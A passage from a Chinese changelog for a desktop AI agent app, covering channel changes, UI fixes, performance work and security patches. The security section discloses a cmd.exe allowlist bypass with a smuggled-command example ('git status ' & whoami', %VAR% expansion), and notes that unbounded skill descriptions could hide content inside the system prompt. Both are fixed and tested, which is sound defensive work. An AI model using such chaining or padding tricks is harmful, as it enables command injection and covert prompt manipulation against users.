  `_manually_named`，`_auto_title` 直接让路（覆盖「首轮还在跑时才改名」的竞态窗口）。
- **标签栏改常驻 + 悬浮胶囊页签**：单会话也显示标签栏（此前只有一个会话时整条
  标签栏隐藏，没有「我现在在哪个会话」的指示）。页签整条浮在顶栏墨线上方，
  墨线从头到尾连续不被遮挡；非激活页签透明、悬停沉一格，激活页签抬升成带
  描边与硬阴影的卡纸胶囊（压线截断与开窗立柱两种融合形态都试过，用户拍板
  定稿悬浮胶囊）。尾部带一个「＋ 新建」入口（与侧栏「新建会话」/ Ctrl+N 同
  一动作）。多标签时页签互相收缩加省略号，不再横向滚动。页签宽度随名称与
  数量自适应（短名窄、长名到上限截断，顶栏空间不足时整条收缩）。等确认的
  标签用金色标题示意。
- **页签可拖动排序**：按住页签左右拖换位，落点是左右缘的竖蓝线（与侧栏列表
  上下缘指示同一语言转 90°）。顺序存 ui.json 的 `tab_order`（sid 数组，随重
  启持久化）；没有自定义序的页签按创建序追加，空标签（未落库的欢迎页）无稳定
  id、不参与排序、始终垫底，也不可拖。提交时从标签栏 DOM 收集当前序一并入偏
  好，避免「拖过的在前、没拖过的在后」两段顺序错乱。

### 变更（渠道）

- **聊天机器人渠道换成飞书：Telegram 渠道整体下线**。飞书渠道改为驱动官方
  `larksuite/cli`（MIT，官方维护）的子进程：收事件用
  `lark-cli event consume im.message.receive_v1 --as bot`（WebSocket 长连接，stdout 逐行
  NDJSON），发消息用 `lark-cli im +messages-send`。长连接不需要公网 IP、域名或内网穿透，
  本地开发环境就能直接收推送——Telegram 在国内网络下本就需要自行解决连通性，换成飞书
  对国内用户实际可用性更好。设置 · 远程控制里的渠道卡片现在是**飞书 + 微信**，凭据各平台
  不同：飞书填 **App ID / App Secret**（开发者后台 → 凭证与基础信息里拿），微信仍是扫码登录。
  选子进程而不是继续手写协议（或引官方 Python SDK），是因为官方 CLI 把握手、心跳、ACK、
  分片、重连这些易错点都封装掉了：手写那 400 行要长期跟进飞书协议演进；官方 Python SDK
  （`lark-oapi`）则要求 `websockets<16`，与本项目固定的 `>=17.1`（uvicorn 的 WS 栈也在用）
  冲突。代价是飞书渠道**多了一个外部可执行依赖**：需要装 `lark-cli`（`npm install -g
  @larksuite/cli`，或在卡片里用 `cli_path` 指定路径），未装时卡片会给可操作提示。
  凭据的落点也做了约束：用 `LARKSUITE_CLI_CONFIG_DIR` 把 CLI 的配置目录指到
  `~/.skysheep/feishu-cli/`，而不是它默认的 `~/.lark-cli/`——否则违反本项目「用户数据一律在
  ~/.skysheep/」的约定，且 dev 身份会与安装版抢同一份凭据。另外几个实测过的契约点：
  CLI 吐出的事件是**扁平结构**且 `content` 已预渲染成人类可读文本（@提及已换成显示名），
  所以适配器直接取 `content`，不再解析 content JSON；事件去重按 `message_id`（CLI 明确
  要求用它，而非 `event_id`）；子进程的 stderr ready 标记（`[event] ready event_key=…`）
  到点必须等到，否则报错而不是静默挂着；群聊消息要求有提及，避免应用被授予
  「接收群聊所有消息」权限后对每句话插嘴（真正的授权边界仍是 allowed_ids）。
- **升级提示**：`config.toml` 里原有的 `[channels.platforms.telegram]` 段不会被自动删除，
  但设置页不再渲染它（没有适配器，留着只是一个永远启不动的死入口）。需要清理可手动删掉
  该段。**Telegram 渠道此后不再提供**，原先绑定的 Telegram 渠道会话（`🤖 telegram` 标题）
  仍留在会话列表里，可直接继续用，只是不再接新消息。

## [1.7] - 2026-09-22

### 修复

- **重启后日程页（及其他右面板标签）首次打开是空白的**：上次开着日程关掉应用，下次启动右面板是展开了、标签也在，但里面只有一层空壳——日程页连「9/21周一 — 9/27周日」那行日期范围都是空的，得先点一下别的标签再点回来才有内容；文件、定时任务、项目任务、任务编排、审查几页同理。根因是启动恢复只处理了 MCP/Skills 一个标签（它的卡片需要搬进面板），其余标签虽然重建了 DOM 却没有触发加载。现在右面板各页的加载入口统一成一张 `RIGHT_TAB_LOADERS` 表，「打开标签 / 激活标签 / 启动恢复 / 切项目重拉」四条路共用一个 `loadRightTab`，不会再漏。顺手修掉两个同源问题：切项目时若面板是收起的，以前会直接跳过重拉（展开后看到的是上一个项目的内容），现在照拉不误（只是不再做那个看不见的压暗提示）；收起期间日程被 Agent 改动，展开时会重新拉一次。
- **圆桌设置四个控件宽窄不一**：同一列里数字框渲染成 80 / 181 / 200 三种宽度，左右边缘都参差。根因是 flex 项默认 `min-width: auto`，而表单控件的「自动最小宽度」取自身固有尺寸（number 输入框约 180px），会把声明的 `flex-basis` 顶开（写 80px 实渲染 ~181px）。现在 `.toolcfg-row` 的文本控件全部补上 `min-width: 0`，`num-sm` 与 `sel-md` 统一为 200px（取下拉最长选项「1 轮 · 看彼此草稿后修订」不截断所需宽度），四个控件左对齐、右齐平。
- **快聊会话完全用不了（连删都删不掉）**：侧栏「快聊」分组 ＋ 建出的会话，以及用「移动会话」移进快聊的会话，点开、发消息、改名、归档、导出、删除全部报 `session not found`，在列表里却看得到。根因是归属校验拿会话的 `project_id` 和当前项目比对，而快聊会话的 `project_id` 是 NULL，两边永远匹配不上——按会话 id 的每个操作都被判成「不是你的会话」。现在归属校验先认本项目、再认「无项目」的快聊，其他项目的会话仍照旧拒绝（跨项目隔离不变）；顺带把归档弹窗与侧栏角标的口径扩到快聊（它不属于任何项目，弹窗若漏掉就意味着归档后永久消失、无从恢复）。
- **聊天机器人渠道首次配置死锁（Telegram/微信都"用不了"）**：启用渠道时被要求允许名单非空，但 chat id 只能由运行中的机器人记进「发现的来源」——机器人不启用就不轮询，不轮询永远收不到第一条消息，两个条件互斥，首次配置卡死在第二步。现在凭据就绪即可启用（空名单仍是"拒绝一切"：未授权来源只记录不回复，安全语义不变）；界面在名单为空时明确提示"现在给机器人发一句话，再回来点「加入允许名单」"。
- **微信扫码登录二维码显示为破图**：微信接口返回的 `qrcode_img_content` 是"要编码进二维码的链接"（官方实现用二维码库渲染它），前端却直接当图片地址塞进 `<img src>`，而那个地址返回的是网页不是图片，界面上只剩一张破图，扫码登录完全无法进行。现在用页面已有的二维码库（与局域网/Tailscale 二维码同一套）渲染真二维码，并保留"打开微信登录链接"的文字兑底。
- **git 克隆安装的技能删不掉（WinError 5 拒绝访问）**：从 GitHub 网址安装的技能带着完整 .git，其中 pack/idx 文件被 git 置了只读位，普通整树删除在 Windows 上直接报权限错误。现在删除前先清只读位（杀软短暂锁文件时稍等重试一次）。
- **扫描本机技能同名重叠**：同一技能常同时装在多家 agent 的目录里（Claude Code / agents / Codex），扫描结果按目录逐个列出，180 个候选里 179 行是重复。现在按名称去重成一条，来源列合并标注（如「Claude Code、Codex」），导入取首个来源。
- **技能描述整段丢失，只剩 ">-"**：SKILL.md 的 frontmatter 解析此前只认「key: 值」单行写法，而技能广场与第三方技能包大量使用 YAML 块标量（`description: >-` 后跟缩进行），会被读成字面量 ">-"。现在正确解析块标量（`>` 折叠为空格、`|` 保留换行，缩进结束即块结束），单行写法不受影响；已装技能下次启动即显示正常。
- **设置页工具清单名字与描述重叠**：工具名（尤其 `mcp__服务器__工具` 长名）此前溢出 122px 定宽格子，画到后面两列底下——徽章盖住中段、描述开头混进名字尾巴，看起来像乱码。现在名字列加宽到 150px 并按省略号截断（等宽字体，悬停看全名）。
- **git MCP 预设「Connection closed」**：预设带 `--repository {dir}` 参数，指向的目录不是 git 仓库时 mcp-server-git 会启动即退出，整台服务器直接废掉。现在预设不带该参数（启动常驻，仓库路径由模型在每次工具调用时传入），指错目录也只是单次调用报错。已添加过的用户：删掉 git 服务后从预设重新添加，或手动把 args 改成 `["mcp-server-git"]`。

### 新增
- **经典视图底部常驻「快聊」区块**：不绑定文件夹的对话（侧栏「快聊」里的会话）现在在经典视图的会话列表末尾也固定露一节——组头带会话数与 ＋（一键新建快聊），组内默认露最近 5 条、其余收进「显示更多」，点开即继续对话。此前它们只出现在分组视图的「快聊」组与「全部项目」的搜索结果里，经典视图下完全看不到入口。数据由 `session.list` 新增的 `quick_sessions` 字段下发（快聊的 `project_id` 是 NULL，永远不会出现在「当前项目」列表里）；与 `all_projects` 同一安全口径，只给本机桌面端，远程客户端的响应里不下发该字段（侧栏也就不显示这个区块）。折叠状态与组内序（`session_order` 的 `quick` 键）与分组视图共用一份。
- **日程周视图可以直接拖出时间段**：空白处按住上下拖就是圈一段时间（拖动中实时显示「12:30 – 15:15」的幽灵块），松手就地弹出小气泡直接写标题，回车即建；点一下空白格仍是单个时点（30 分钟就近取整，与从前一致）。已有时段块可拖上下边缘改开始/结束时间、拖块身整体平移，拖动中只改块的位置与高度、松手才落库一次；点块身（不拖）照旧打开完整编辑弹窗。气泡里带提醒开关、可折叠备注，以及「更多选项…」转成完整弹窗（当前已填的值会预填过去）。拖动走 pointer 事件与指针捕获，鼠标移出网格也不会丢；网格设 `touch-action: none`，触屏拖选不会被当成滚动。
- **日程支持设定时间段**：新增/编辑弹窗多一个「设定时间段」开关，勾上后填结束时间，就是「14:00–16:00」这样的区间（不勾仍是从前的单个时刻）。周视图里时间段按真实时长撑高成一块，列表与提醒横幅都显示「起—止」（跨天会补上结束日期）。改开始时间时结束时间跟着平移、保持原时长；结束时间早于或等于开始时间会被拦下。Agent 侧的 `schedule_write` 同步支持 `end_at`，说「下午 2 点到 4 点开会」会直接记成区间；库里 `schedules` 表新增 `end_at` 列（旧库自动补列，0 = 按点事件，旧数据不受影响）。
- **项目任务清单**：右侧面板新增「项目任务」页签——每个项目自己的待办清单：输入框回车快速添加，点「＋ 新建任务」可补写详细要求与完成标准，点条目可编辑，做完勾掉自动垫底，悬停可删。任务与项目绑定，删项目时一并清掉（库里新增 project_tasks 表）。
- **侧栏固定「项目 / 快聊」两个分组（分组视图）**：「项目」各自展开会话，现在当前项目也能删（自动切到剩余项目，或删空后进入快聊）；「快聊」分组改为常驻——不绑定文件夹、只需要能对话的地方，组头 ＋ 一键新建快聊对话。
- **内置子代理从两个扩到六个**：新增 Reviewer（审查员：按严重度输出代码/文档审查清单）、Researcher（调研员：联网搜索与抓取公开资料，结论带来源）、Writer（写手：产出可直接使用的文档/报告成稿）、Planner（规划师：拆解任务出分步计划含验证方式与风险）。每个都有专属角色提示词，可单独指定模型与思考强度；模型派活任务时 spawn_agent 的说明会列出全部可用类型。
  六个内置型现在都可编辑：设置页每行新增「编辑」按钮，可改职责描述与角色提示词（占位文字展示内置默认值，清空保存即恢复默认），改过的行会标「已定制」；覆盖后的描述同步进 spawn_agent 的说明文字，模型派活时按新描述选型。
- **技能批量管理**：「扫描本机技能」弹窗加「全选 / 全不选」按钮；已装技能列表加行首勾选框与「全选 / 删除所选（N）」，可一次删除多个技能（带确认弹窗，逐个报错不中断）。
- **应用内一键更新（安装版）**：设置 · 关于发现新版本后可直接「一键更新」——下载最新安装包（MZ 头校验 + .part 暂存，防断流半截文件被误装）→ 点「退出并安装」自动退出并静默运行安装器（安装器带同一单实例互斥体，延迟拉起等本进程退出后再装）。源码版不提供应用内更新，提示 git pull。

### 变更
- **「扫描本机」改为「本机现存」，候选直接平铺在技能页下方**：以前点按钮弹窗勾选，现在点「本机现存」后候选列表就地展开在技能页按钮下方（不遮挡背景、不丢失滚动位置）：每项带名称、描述、来源徽章，已装过的灰显；工具条含全选 / 全不选与计数，底部一行选「装到哪里」并「导入所选」，导入后自动重新探测（刚装过的转为灰显）。总览卡片的同名按钮先进入技能页再拉取；返回总览时面板自动收起。
- **项目可以删到零个（无项目态成为一等状态）**：撤掉本窗口早先引入又撤销的「至少保留一个项目」限制，现在正在使用的项目也可以直接删——删掉后自动切到剩余的最近项目，一个不剩就进入「无项目态」：不绑文件夹的对话照常可用（聊天、搜索、记忆、日程、定时任务都正常），文件/命令类工具会明确提示先添加项目，不再假装有工作目录。当前项目记在 ui.json 的 `active_project`（0 = 无项目态，由后端独占读写），重启后回到同一个状态：记着项目就恢复该项目，记着 0 就停在快聊。信任弹窗、项目级 MCP/技能在无项目态一律不生效（没有项目就没有可信任之物）。
- **模型配置新增「检测」上下文窗口**：服务详情页「上下文上限」旁新增检测按钮，向该服务查询模型的真实窗口并一键填入（保存后生效）。OpenAI 兼容服务走 /models 里的窗口字段（OpenRouter / SiliconFlow / vLLM 等各家字段名不一，逐个试），本机 Ollama 走 /api/show；不提供窗口信息的服务（如 Anthropic）会说明原因。检测与拉取模型同列本机专属方法（防已存 Key 外发）。
- **侧栏新建入口文案改为「新建会话」**：侧栏顶部按钮与收起后窄栏的 ＋ 原本写「新建任务」，容易被读成「项目任务」页签里的待办条目；现统一为「新建会话」，与 `/new`、Ctrl+N 的行为一致（项目任务页签的「＋ 新建任务」不变）。

- **全局上下文上限默认值 80000 → 1,000,000**：设置 · 高级的「上下文上限」与各服务留空时的全局兜底值都改为 100 万 token，适配窗口越来越大的模型（GLM / Kimi / Claude 等 200K~1M 级）；旧模型仍建议按真实窗口手动调小，否则压缩会来得太晚。

## [1.6] - 2026-09-21

### 新增

- **多实例并存（`SKYSHEEP_INSTANCE`）**：给一份安装起一个身份名（如 `dev`），数据目录、
  单实例互斥体名、窗口标题、开机自启注册表项四处同时跟随身份变化，因此同一台机器上
  可以同时跑两份 SkySheep 而互不干扰。典型用法是**源码版用来改代码/跑验证、安装版
  用来日常使用**：源码目录的三个入口（`启动SkySheep.bat`、`engine/SkySheep.pyw`、
  `uv run skysheep app`）现在默认落到 `dev` 身份（数据在 `~/.skysheep-dev/`），安装版
  继续用 `~/.skysheep/`，两边会话、配置、技能、日志、权限档位（`ui.json` 的
  `accept_edits`）全部隔离，也不再互相抢互斥体。显式指定 `SKYSHEEP_HOME` 时仍按它走、
  不叠加后缀（测试与临时环境语义不变）。身份名限 `[a-z0-9][a-z0-9_-]{0,23}`：它会进
  文件名与互斥体名，放过路径分隔符会变成目录穿越，放过大小写变体则会让 `Local\` 下的
  两个互斥体判定成不同名字、隔离静默失效。新增 `src/skysheep/instance.py` 作为唯一
  口径来源；`engine/desktop.py` 为保启动速度镜像了一份同样的规则，两边一致性由
  `tests/test_instance.py` 逐项锁定。

- **内置工具全量导出 MCP 注解**：`Tool` 新增 `read_only_hint` / `destructive_hint` /
  `idempotent_hint` / `open_world_hint` 四个类属性，`to_schema()` 以 `annotations`
  （`readOnlyHint` 等四布尔，MCP `tools/list` 标准语义）导出，31 个内置工具全部按
  真实语义显式声明；接入的远程 MCP 工具未声明时落到基类缺省（宁可疑其有写、有
  破坏性，让宿主多确认一次）。发往模型 API 的载荷不含注解——openai_compat 改为
  按白名单取键（anthropic_provider 本就如此），严格网关不会因未知字段拒收。外部
  宿主与工具目录（M8ven Trust Index、OpenAI directory 等）据此在调用前分级提示。
  新增 `tests/test_tool_annotations.py`，把全部内置工具逐个点名锁住注解齐全与语义。

- **README 挂 M8ven Trust Index 徽章**：收录页 m8ven.ai/mcp/sky-scrape/skysheep，
  徽章为对方实时维护的图片（认领并核验后由「M8ven Trust」自动翻转为「M8ven
  Verified」）；架构一节补充代码可审计性说明（`vendor/` 为第三方上游压缩发布件，
  非混淆的项目源码）。

- **结构化日志与可观测性**：桌面日志此前只有固定文本格式，回答「这个任务为什么
  卡了 30 秒」只能翻几千行文本估时间差，`usage_log` 也只看得到 token。新增
  `src/skysheep/obs.py`：不引入新依赖、不改变既有行格式，而是在消息尾部追加一段以
  固定标记 `| json | ` 开头的 JSON，既有日志阅读方式与诊断包的尾读逻辑都不受影响，
  需要机器分析时按标记切出 JSON 即可（`obs.parse_structured`）。轮次收尾处记录一条
  `ev=turn`：总耗时、工具调用次数与总耗时、工具错误数、权限等待次数与等待耗时、
  token 出入、是否被停止/是否圆桌/异常类型；这些统计从事件流累加得到，不进核心
  循环热路径。用例见 `tests/test_obs.py`。

- **测试分层与真实网络栈端到端**：新增 `e2e` / `slow` 两个 marker（`pyproject.toml`），
  `pytest -m e2e` 只跑端到端、`-m "not e2e"` 跳过。新增 `tests/test_ws_e2e.py`：
  这是全库唯一经真实 uvicorn + 真实 socket 的用例（此前全部走 `TestClient` 的进程内
  ASGI 直调，握手、分帧、长连接都没被测过），覆盖 boot 快照、一轮流式对话的事件到达
  与正文拼接、同一条连接连续两轮、未知方法返回 `ok=false` 而非断开。


### 修复

- **MCP 服务器崩溃后不再只能手动重建，且断连不再让工具永久失效**：
  `MCPTool` 此前在构造时固持 `session`，服务器一崩，已注册进 registry 的工具实例
  会永远指向那个死会话——重连再成功也修不好这些工具对象；同时没有任何重连机制，
  只能靠用户改配置或重启触发重建。现在：工具改为保存 manager + 服务器名，调用时
  向 manager 取**当前**会话（`session_for`）；传输层失败（超时/连接错）由
  `note_call_failure` 标记断线并预约后台重连，但**不重放本次调用**——服务器可能已
  执行过这条工具，重放会重复副作用；重连按指数退避（2s 起，封顶 20s）有界进行
  （`MAX_AUTO_RESTARTS = 3`），达到上限即停手并把结论写进状态，交给用户在设置页
  手动重连；同一台服务器同时只允许一条重连链（`request_reconnect` 去重），
  `shutdown()` 会先取消这些后台任务再关连接，避免与退出抢资源。工具层的语义错误
  （`is_error`，如参数不对）不视作断线，不触发重连。状态新增 `reconnecting` /
  `restarts` 两个字段随 MCP 状态一并回传前端。回归用例见 `tests/test_mcp.py`
  （会话调用时解析、断线不重放、重连去重、达上限停手、未连接时的可读错误）。

- **启动脚本写死作者本机绝对路径**：`启动SkySheep.bat` 原先直接 `cd /d` 到一个
  作者本机的绝对路径，别人克隆后一行都跑不起来，同时把作者的本地目录结构留在
  了公开仓库顶层。改为用 `%~dp0` 按脚本自身位置定位 `engine`，并补
  `pyproject.toml` 存在性检查（脚本被挪出仓库根时给出明确提示而不是扑空的 cd）；
  顺带去掉了让 `@echo off` 失效的 UTF-8 BOM（首行带 BOM 时 cmd 会把 `@echo off`
  当成未知命令报错），文件回归纯 ASCII。


### 安全

- **命令白名单的拼接判定按实际 shell 取，堵住 `cmd.exe` 的两条绕过面**：
  `security/gate.py` 的 `_has_shell_chain` 此前用一套 POSIX 引号规则同时套两平台，
  而 Windows 的命令实际交给 `cmd.exe /d /s /c`（见 `tools/shell.py`）。实测两个漏洞：
  ① `cmd.exe` **不认单引号**，`git status ' & whoami` 里的 `&` 照样分隔命令，旧逻辑
  却因“单引号内是字面量”跳过判定，于是带 `git status` 前缀白名单的用户会被放行一条
  会执行第二条命令的输入；② `cmd.exe` 会做 `%VAR%` 环境变量展开，而变量值可以含
  `&`/`|`（本机 `PATH`、`PATHEXT` 即含 `;`），等于把“参数”变成“命令”，旧逻辑完全
  未把 `%` 视为拼接面。现在单引号只在非 Windows 下作为引号处理，Windows 上额外把
  `%` 与分隔符同等对待；`;` 在两平台都拦（纵深防御）。确认弹窗与设置页规则测试器的
  解释文案改由 `_chain_hint()` 按平台生成，与实际判定一致。回归用例：`test_gate.py`
  的 `test_prefix_rule_rejects_windows_quirk_expansions`（含 `%TEMP%` / `%COMSPEC%` / 单引号拼接）、
  `test_quoted_separator_is_not_chaining`（按平台分支）、`test_prefix_rule_rejects_unicode_and_unc_edge_cases`
  （Unicode 空白、全角分号、UNC 路径）与 `test_chain_hint_mentions_platform_quirks`。

- **技能 name/description 限长后再进系统提示词**：`SKILL.md` 的 frontmatter 来自
  外部（技能广场 / 第三方仓库），而 `render_prompt_section` 会把 name 与 description
  拼进系统提示词的 Skills 清单。此前二者都无长度限制（实测 5000 字符描述原样注入），
  超长描述会挤占上下文，也能用大量空白行把内容推到看不见的位置——与 MCP 工具描述
  同一类风险，但 MCP 侧已有 1000 字符截断而技能侧没有。现改走 `_sanitize_name` /
  `_sanitize_description`（120 / 1000 字符上限 + 压掉连续空行），与
  `mcp/client.py` 的 `_sanitize_description` 同一套处理；正文不受影响，仍由
  `load_skill` 的 20000 字符上限兜住。回归用例 `test_skill_description_and_name_are_bounded`。

- **static 挂载对点开头路径的纵深防线**：`StaticFiles` 不拒隐藏路径，
  `/static/.<any>` 会按普通文件返回。1.0/1.1/1.2 的安装包正因打包侧整目录
  收集静态资源，把开发期的 `.mimosa/`（变更哈希、会话 id、前端源码快照）
  打进了 `_internal/skysheep/server/static/`，而该目录被 `StaticFiles` 挂载，
  未认证可读（仅回环免令牌，是完整的对外可达路径）。打包侧（`SkySheep.spec`）
  自 1.3 起已在收集阶段跳过点开头路径，本次在 `app.py` 的 `/static` 挂载前
  再堵一道：点开头分段一律 404（`_is_hidden_static_path`）。附回归测试
  `test_static_hidden_paths_not_served`（已反向验证：移除防线则测试失败）。


### 性能

- **对话流式事件合并降帧**：上游 provider 的 delta 粒度是 token 级（实测按 4 字符
  一段产出），一轮长回答会产生上千条事件，每条都要过 WS 发送锁并单独 JSON 序列化
  一帧；终端输出早已做过同类合并（`TerminalManager.TERM_MERGE_S`），对话流此前没有。
  新增 `server/backend.py` 的 `StreamDeltaMerger`：把连续的同类型增量
  （`text_delta` / `thinking_delta` / `roundtable_member_delta`，后者按
  `(member_index, round)` 再分组）拼成批量帧，三条硬约束都有回归用例锁定——
  ①不丢内容（合并前后拼接逐字一致）；②顺序不变（非增量事件到达时先冲刷缓冲，
  不同类型切换也各自冲刷）；③收尾必冲刷（含一个窗口定时器，避免模型中途停顿时
  尾巴被无限期挂在缓冲里；`_run_turn_pipeline` 的 `finally` 覆盖正常/异常/取消三条
  路径）。首条增量仍立即发出，首字延迟不变。用例见 `tests/test_stream_merge.py`
  （含 1000 条增量的帧数回归门槛）。

- **长会话切换不再一次同步画完**：`renderHistory` 此前对全部消息一个同步循环重建
  DOM，每条 assistant 消息还各跑一次 markdown / mermaid / 代码高亮；数千条的会话
  会把主线程占满，表现为切会话长白屏。现改为分批渲染（阈值 `HISTORY_SYNC_LIMIT = 200`，
  每次 `HISTORY_CHUNK = 100` 条，`requestAnimationFrame` 分帧）：阈值以下仍一次画完
  （不多付一帧延迟，行为与从前一致）；超阈值时首段同步画（`openTabForSession` 返回后
  立即看 `children.length` 判空会话，零节点会被误判为空会话），后续分批追加，
  并在追加前检查用户是否仍在底部——已往上翻就不再抢滚动位置。

- **文件树刷新加尾部防抖**：Agent 一轮里连续写多个文件时，此前每次都直接
  `loadFiles(true)`，等于「一次 `fs.files` 全量 `os.walk` + 一次整树重渲染」× N。
  改为 `scheduleFilesRefresh()` 尾部防抖（400ms），只刷最后一次；手动「刷新」按钮
  仍是立即路径（用户的点击要有即时反馈），切项目时 `resetProjectPanels` 会清掉待发
  定时器，避免把旧项目的目录树画到新项目上。


### 清理

- **出库开发期调试残留**：`engine/x1.txt`、`engine/x2.txt`（`tests/test_agent.py`
  实际走 `tmp_path`，这两个是手动跑测试留在仓库根旁的残留）、
  `engine/rt-menu-default.png`（全库无任何代码或文档引用）、
  `engine/AGENTS.md`（0 字节空文件，1.4 提交时以零变更单独入库）。四者都不会
  进入构建产物，只是把仓库表弄脏。

- **`.gitignore` 补齐防回归规则**：`*.db-wal` / `*.db-shm`（1.3 起 SQLite 用
  `journal_mode=WAL`，此前只忽略了 `*.db-journal`，长连接未关闭时这两个伴生
  文件里还可能带着已提交数据）；`.tmp-*/`（`SKYSHEEP_HOME` 指向的临时 home 与
  截图验证工作目录）；`nul`（Windows 上把 `> /dev/null` 误写成 `> nul` 会建出
  名为 nul 的文件）；`Thumbs.db` / `desktop.ini` / `.DS_Store`（此前 `Thumbs.db`
  只是被 `*.db` 规则意外匹配，属巧合而非有意忽略）。

## [1.5] - 2026-09-21

### 修复

- **启动器卡死连环锁（一天三次“双击打不开”的根修）**：窗口创建阶段 WebView2/.NET
  初始化异常时 `create_window` 会永久阻塞——进程握着单实例互斥体却永远不出窗口，
  而后续每次双击又会在 `_focus_existing_window` 里被卡死窗口的同步 Win32 调用
  （GetWindowTextW / ShowWindow 会向停转的消息泵发消息并等待）一起拖住，
  连日志都写不出，最终堆积十余个僵屦进程，只能去任务管理器手动清。三处根治：
  聚焦改为非阻塞（`ShowWindowAsync` + 枚举前用 `IsHungAppWindow` 跳过卡死窗口，
  本进程不再被拖住）；新增卡死接管——互斥体被占且超过启动宽限期（12s）仍无
  可用窗口时，按“pid + 进程创建时刻”双重校验身份后结束僵屦实例并正常启动
  （双重校验防 pid 复用误杀无关程序）；新增窗口创建看门狗——超 30s 仍建不出
  窗体就主动退出释放互斥体，下次双击即正常。另修复启动期后台线程与 WebView2
  初始化并发首次 `LoadLibrary` 抢装载器锁的风险（DLL 句柄提前在主线程预热）。
- **WebView2 每次启动用全新临时 profile**：私有模式下每次启动都新建临时用户数据
  目录且从不清理（TEMP 里堆积大量 skysheep-* 残留），浏览器环境每次从零初始化。
  改为固定 `~/.skysheep/webview` 复用 profile，cookie/localStorage 也随之持久化。

### 新增

- **分组视图项目拖动排序**：侧栏分组视图的项目组头现在可以按住鼠标拖动换位，
  松手即保存到 ui.json（`project_order`，仿 `right_tabs` 的数组型偏好，清洗：
  正整数去重封顶），`project.list` 按保存序返回——经典视图的项目列表也跟着吃到
  同一顺序。拖动中目标组的上/下缘画蓝色指示线，落在上半场插前面、下半场插后面；
  「快聊 / 其他」两个伪组不参与拖拽，始终留在尾部。名单外的新项目不会被旧偏好
  藏掉：仍按创建序追加在已排序尾部。带测试（偏好清洗 / 排序生效 / 新项目追加）。
- **分组视图组内会话拖动排序**：项目组下的会话行同样可拖动换位（同款上/下缘
  指示线，只限同组内拖，跨组不支持——换项目走会话自己的入口）。顺序存 ui.json
  的 `session_order`（项目 key → 会话 id 数组，整体替换语义）；渲染时保存过的
  会话按保存序排前，没拖过的与新会话按默认序（置顶、新在前）接着排，旧偏好
  不会藏掉新会话；「显示更多」里未渲染的行在提交时与可见序合并，不因拖动丢位。
  **只允许同级变动**：⑂ 分支会话（`session.fork` 标题带前缀的子会话）作为家族块
  跟随父会话参与排序——渲染时强制聚拢在父后（不再因 updated_at 更新跑到父外），
  拖拽以块为单位移动，落点折算到块头，父子相对位置不可变。带测试（偏好清洗
  与整体替换语义）。
- **分叉会话前缀换为 └**：`session.fork` 生成的子会话标题前缀由 ⑂（OCR fork
  字符，中文界面字体下笔画过细、小字号几乎看不清）换成制表符 └（分支语义、
  笔画实）；前端识别子会话时新旧前缀都认，旧会话的家族聚拢不受影响。
- **经典视图也支持拖动排序**：项目列表与（本项目范围的）会话列表同样可拖动
  换位，与分组视图共用同一份 project_order / session_order——任一视图调好序
  另一边同步。拖拽手势重构成通用 wireListDrag（落点重定向与提交回调化），
  家族块规则（└/⑂ 子会话跟随父）两种视图一致；boot 快照补 project_id，
  项目站内切换后经典视图的会话排序键即时跟随。
- **内置 MCP 预设新增「cua 电脑驱动」（cua-driver）**：接入 cua.ai 开源桌面驱动，
  辅助功能树按界面元素精准操控本机应用与浏览器（含已登录会话），免焦点不抢
  鼠标键盘，补足内置七件套「截图看图猜坐标」的短板。默认不接入——预设只提供
  一键添加入口，是否使用由用户决定；工具按非只读分级，每次调用走权限门确认。
  该驱动是本机独立程序（需先按 cua.ai 指引安装），预设依赖档相应新增 `local`
  （本机已装程序，区别于 uv / node）。
- **思考过程与用时：刷新后不再丢**。思考型模型的推理内容此前只活在当前页面，
  「用时」芯片也只由本轮事件当场创建——刷新或重进会话后两者都会消失（用时
  是彻底消失，思考块能恢复但只显示字数）。现在每轮的真实墙钟耗时与接手时
  的预估区间随消息内容一起落库，重进会话后回复上方仍显示「⏱ 用时 4 分 32 秒 ·
  预估 3~8 分钟」（悬停看预估依据），思考折叠块标题也从「N 字」升级为
  「N 字 · 思考 12 秒」，能看出模型想多久、答多久。历史恢复默认折叠，
  不占空间。
- **导出与渠道端同步透出**。HTML 导出此前只输出正文，现在补上用时芯片与
  思考过程折叠块（`<details>`，无需 JS）；Markdown 导出补「⏱ 用时 · 预估」
  行与「💭 思考过程」引用段。Telegram / 微信遥控端在回复尾部附一行
  「⏱ 用时 X · 思考 Y · N 字」——遥控时看不到桌面界面，这是唯一的耗时反馈；
  不整段回传思考文本（手机屏幕小，长推理会淹没回答）。

### 修复

- **设置侧栏导航观感失衡（字号 / 间距 / 选中态 / 分组辨识）**：条目 13.5px 加 7px
  内边距比全局侧栏列表大一号，整列被拉得又高又松；分组标题与条目同列起点、
  留白相近，看起来像多出来的一行，「能力 / 日常」等分组下的选项分不清归谁；
  选中项「蓝底＋蓝框＋蓝字＋粗体」四种强调叠加过重。现在条目与全局 `.list`
  统一（13px / 5px 8px，避开半像素字号发虚）并相对标题缩进一格；分组标题
  加通栏底线（同对话栏分组头的分区语言）、字重提到 800，靠缩进差＋底线＋
  字重三件事建立「标题相」；选中态只留淡蓝底＋蓝字（去蓝框）。
- **消息导航条高亮不跟随滚动，卡在最后一个点上（滑动时看着像直接跳到开头）**。
  右侧那列小圆点靠「当前视口那颗拉长成实色亮条」指示位置。重排后的校准步骤
  写成 `miniTargets.map(miniTopOf)`——`Array.map` 会把**数组索引**当第二个参数
  传给回调，而 `miniTopOf(el, logRect)` 的第二参是矩形对象，于是 `logRect` 拿到
  的是索引（0 之外的数字），`r.top` 变 `undefined`，整列纵位全成 `NaN`；
  `miniUpdateActive` 里 `NaN <= mark` 恒为假，高亮永远落在第一颗。实测：
  `[0,1,2,3,4].map(miniTopOf)` 得到 `[0, NaN, NaN, NaN, NaN]`，
  包一层箭头函数后才是 `[0, 62.5, 125, 187.5, 250]`。现在改为
  `map((el) => miniTopOf(el))`，高亮随滚动逐点推进（实测 49 个采样点
  从 25 递减到 0，覆盖全部 26 个点、无跳变）。
- **消息导航条高亮宽度是「跳」而不是「渐变」**。右侧那列小圆点靠当前视口那颗
  拉长成实色亮条、相邻按距离递减来指示位置，宽度由 CSS 自定义属性 `--mini-w`
  驱动、`transition: width` 负责平滑。但每次重排（`miniRebuild`）都把整列
  `textContent = ""` 清空重建——新插入的元素首帧就带着目标宽度，浏览器没有
  「起始值」可插值，`transition` 被直接跳过（实测：新建元素 0 个过渡动画，
  复用元素 1 个 running、90ms 时停在中间宽度）。滚动时每次重排都是硬切，
